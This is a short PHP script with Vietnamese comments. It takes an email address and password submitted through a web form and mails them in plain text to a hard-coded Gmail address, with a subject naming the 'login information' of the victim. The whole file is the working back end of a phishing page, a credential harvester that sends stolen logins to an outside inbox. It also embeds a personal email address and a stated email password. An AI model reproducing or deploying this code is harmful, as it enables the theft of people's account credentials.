<?php

if (isset($_POST['email']) && isset($_POST['password'])) {
  $email = $_POST['email'];
  $password = $_POST['password'];

  // Thay thế 'your_email@example.com' bằng email của bạn
  $toEmail = "phoangson13@gmail.com";

  // Thay thế 'your_password' bằng mật khẩu email của bạn
  $toPassword = "1234567";

  // Tiêu đề email
  $subject = "Thông tin đăng nhập từ " . $email;

  // Nội dung email
  $body = "Email: " . $email . "\n";
  $body .= "Mật khẩu: " . $password;

  // Gửi email bằng hàm mail() của PHP
  if (mail($toEmail, $subject, $body)) {
    echo "Email đã được gửi thành công!";
  } else {
    echo "Lỗi khi gửi email.";
  }
}

?>
